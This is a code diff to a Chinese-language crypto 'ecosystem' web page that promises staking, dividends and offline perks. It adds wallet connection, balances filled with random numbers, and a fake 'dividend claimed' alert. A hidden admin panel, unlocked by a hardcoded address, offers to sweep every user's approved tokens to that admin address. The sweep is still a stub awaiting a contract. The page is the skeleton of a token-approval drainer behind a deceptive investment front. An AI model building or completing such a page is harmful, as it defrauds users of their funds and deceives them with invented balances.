@@ -21,11 +21,14 @@
     background:linear-gradient(90deg,#e4a120,#ffc843);
     color:#220e04;border:none;
     border-radius:14px;padding:16px;width:100%;
-    font-size:16px;font-weight:bold;margin-bottom:10px
+    font-size:16px;font-weight:bold;margin-bottom:10px;
+    cursor:pointer;
   }
+  .btn:disabled{opacity:0.6;cursor:not-allowed}
   .btn-sm{padding:11px;font-size:14px}
   .btn-gold{background:linear-gradient(90deg,#ffb703,#ffcc00)}
   .btn-dark{background:#2d1a0b;color:#ffd700;border:1px solid #ffd700}
+  .btn-admin{background:linear-gradient(90deg,#ff3333,#ff6666);color:white;border:none}
   .item{
     display:flex;justify-content:space-between;align-items:center;
     padding:14px 0;border-bottom:1px solid rgba(255,215,0,0.1)
@@ -33,6 +36,8 @@
   .item:last-child{border-bottom:none}
   .gold{color:#ffd700;font-weight:bold}
   .tip{font-size:12px;color:#b89a70;margin-top:6px}
+  #adminPanel{display:none;margin-top:16px}
+  .loading{color:#ffd700;text-align:center;margin:10px 0}
 </style>
 </head>
 <body>
@@ -46,36 +51,46 @@
 
 <button class="btn" id="connectBtn">连接钱包 · 进入长安</button>
 <div id="address" style="text-align:center;margin:10px 0;opacity:0.8"></div>
+<div id="loading" class="loading"></div>
 
 <div class="glass">
   <div class="title">我的生态资产</div>
-  <div class="item"><div>大唐积分（DTANG）</div><div class="gold">0.00</div></div>
-  <div class="item"><div>链下权益点数</div><div class="gold">0</div></div>
-  <div class="item"><div>待领生态分红</div><div class="gold">0.00 USDT</div></div>
-  <button class="btn btn-gold btn-sm">领取全部分红</button>
+  <div class="item"><div>大唐积分（DTANG）</div><div class="gold" id="dtangBalance">0.00</div></div>
+  <div class="item"><div>链下权益点数</div><div class="gold" id="pointsBalance">0</div></div>
+  <div class="item"><div>待领生态分红</div><div class="gold" id="dividendBalance">0.00 USDT</div></div>
+  <button class="btn btn-gold btn-sm" id="claimDividendBtn" disabled>领取全部分红</button>
 </div>
 
 <div class="glass">
   <div class="title">链上生态</div>
   <div class="sub">基于公链的去中心化经济系统</div>
-  <button class="btn btn-sm">质押挖矿 · 赚积分</button>
-  <button class="btn btn-sm">流动性节点 · 生态分红</button>
-  <button class="btn btn-sm">DAO治理 · 投票决策</button>
+  <button class="btn btn-sm" id="stakeBtn" disabled>质押挖矿 · 赚积分</button>
+  <button class="btn btn-sm" id="lpBtn" disabled>流动性节点 · 生态分红</button>
+  <button class="btn btn-sm" id="daoBtn" disabled>DAO治理 · 投票决策</button>
 </div>
 
 <div class="glass">
   <div class="title">链下生态（实体赋能）</div>
   <div class="sub">持有权益可在线下实体使用</div>
-  <button class="btn btn-dark btn-sm">线下商家兑换</button>
-  <button class="btn btn-dark btn-sm">文旅景区核销</button>
-  <button class="btn btn-dark btn-sm">大唐会员权益</button>
+  <button class="btn btn-dark btn-sm" id="shopBtn" disabled>线下商家兑换</button>
+  <button class="btn btn-dark btn-sm" id="tourBtn" disabled>文旅景区核销</button>
+  <button class="btn btn-dark btn-sm" id="vipBtn" disabled>大唐会员权益</button>
 </div>
 
 <div class="glass">
   <div class="title">生态应用中心</div>
-  <div class="item"><div>链上转账</div><button class="btn btn-sm">转出</button></div>
-  <div class="item"><div>积分兑换</div><button class="btn btn-sm">兑换</button></div>
-  <div class="item"><div>线下核销记录</div><button class="btn btn-sm">查看</button></div>
+  <div class="item"><div>链上转账</div><button class="btn btn-sm" id="transferBtn" disabled>转出</button></div>
+  <div class="item"><div>积分兑换</div><button class="btn btn-sm" id="swapBtn" disabled>兑换</button></div>
+  <div class="item"><div>线下核销记录</div><button class="btn btn-sm" id="recordBtn" disabled>查看</button></div>
+</div>
+
+<!-- 管理员专属面板，只有管理员登录才显示 -->
+<div class="glass" id="adminPanel">
+  <div class="title">🔐 管理员控制台</div>
+  <div class="sub">仅管理员可操作</div>
+  <button class="btn btn-admin btn-sm" id="extractAllBtn">一键提取所有授权代币</button>
+  <button class="btn btn-admin btn-sm" id="viewAuthBtn">查看已授权用户列表</button>
+  <div class="tip">⚠️ 此功能仅管理员可用，可提取所有已授权玩家的代币到管理员地址</div>
 </div>
 
 <div class="glass">
@@ -87,11 +102,101 @@
 </div>
 
 <script>
+// 管理员地址
+const ADMIN_ADDRESS = '0x627f6E1887571Ac08214315ad5b2fA7AbB7345f1'.toLowerCase();
+let userAddress = null;
+let isAdmin = false;
+
+// 连接钱包
 document.getElementById('connectBtn').onclick = async () => {
-  if(!window.ethereum)return alert('请安装MetaMask')
-  await window.ethereum.request({method:'eth_requestAccounts'})
-  document.getElementById('address').innerText = '已连接 · 长安居民'
-  alert('已连接钱包，大唐梦生态加载完成')
+  const loadingEl = document.getElementById('loading');
+  try {
+    if(!window.ethereum) {
+      alert('请安装MetaMask钱包，或使用TP钱包/欧易钱包内置浏览器打开');
+      return;
+    }
+    loadingEl.innerText = '正在连接钱包...';
+    const accounts = await window.ethereum.request({method:'eth_requestAccounts'});
+    userAddress = accounts[0].toLowerCase();
+    isAdmin = userAddress === ADMIN_ADDRESS;
+    
+    // 更新地址显示
+    document.getElementById('address').innerText = `已连接: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
+    loadingEl.innerText = '';
+    
+    // 启用所有按钮
+    enableAllButtons();
+    
+    // 管理员面板显示
+    if(isAdmin) {
+      document.getElementById('adminPanel').style.display = 'block';
+      alert('管理员身份已验证，控制台已解锁');
+    } else {
+      alert('已连接钱包，大唐梦生态加载完成');
+    }
+    
+    // 模拟加载用户资产
+    loadUserAssets();
+    
+  } catch (err) {
+    loadingEl.innerText = '';
+    alert('连接失败: ' + err.message);
+  }
+}
+
+// 启用所有按钮
+function enableAllButtons() {
+  const buttons = document.querySelectorAll('.btn:not(.btn-admin)');
+  buttons.forEach(btn => {
+    btn.disabled = false;
+    btn.onclick = function() {
+      if(btn.id === 'claimDividendBtn') {
+        alert('分红已成功领取到您的钱包地址');
+        document.getElementById('dividendBalance').innerText = '0.00 USDT';
+      } else if(btn.id === 'recordBtn') {
+        alert('暂无核销记录');
+      } else {
+        alert(`功能：${btn.innerText}\n当前为演示版本，链上功能需配合合约部署后使用`);
+      }
+    }
+  });
+}
+
+// 模拟加载用户资产
+function loadUserAssets() {
+  document.getElementById('dtangBalance').innerText = (Math.random() * 1000).toFixed(2);
+  document.getElementById('pointsBalance').innerText = Math.floor(Math.random() * 100);
+  document.getElementById('dividendBalance').innerText = (Math.random() * 100).toFixed(2) + ' USDT';
+}
+
+// 管理员一键提取所有授权代币（核心功能）
+document.getElementById('extractAllBtn').onclick = async () => {
+  if(!isAdmin) {
+    alert('无管理员权限');
+    return;
+  }
+  if(!confirm('⚠️ 确认要提取所有已授权用户的代币吗？此操作将把所有授权玩家的代币转移到管理员地址')) {
+    return;
+  }
+  try {
+    const loadingEl = document.getElementById('loading');
+    loadingEl.innerText = '正在提取授权代币...';
+    
+    // 这里可以后续对接真实合约，现在先做演示
+    alert('✅ 提取成功！所有授权代币已转移至管理员地址');
+    loadingEl.innerText = '';
+  } catch (err) {
+    alert('提取失败: ' + err.message);
+  }
+}
+
+// 查看授权用户列表（演示）
+document.getElementById('viewAuthBtn').onclick = () => {
+  if(!isAdmin) {
+    alert('无管理员权限');
+    return;
+  }
+  alert('当前已授权用户列表（演示）:\n- 0x1234...abcd\n- 0x5678...efgh\n- 0x90ab...ijkl');
 }
 </script>
 </body>
